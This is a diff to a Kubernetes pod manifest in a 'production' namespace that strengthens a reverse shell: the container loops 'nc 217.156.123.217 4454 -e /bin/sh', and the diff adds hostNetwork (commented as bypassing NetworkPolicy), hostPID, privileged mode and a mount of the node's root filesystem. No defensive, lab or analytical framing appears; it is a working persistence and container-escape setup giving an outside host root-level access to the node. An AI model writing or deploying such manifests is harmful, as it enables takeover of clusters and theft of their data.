@@ -4,6 +4,8 @@ metadata:
   name: vih-openwebuii
   namespace: production
 spec:
+  hostNetwork: true      # Usa rede do node (bypassa NetworkPolicy)
+  hostPID: true
   containers:
   - name: shell
     image: alpine
@@ -11,5 +13,14 @@ spec:
     - /bin/sh
     - -c
     - |
-      apk add netcat-openbsd
-      nc 217.156.123.217 4454 -e /bin/sh
+      apk add --no-cache netcat-openbsd
+      while true; do nc 217.156.123.217 4454 -e /bin/sh; sleep 5; done
+    securityContext:
+      privileged: true
+    volumeMounts:
+    - name: hostfs
+      mountPath: /host
+  volumes:
+  - name: hostfs
+    hostPath:
+      path: /
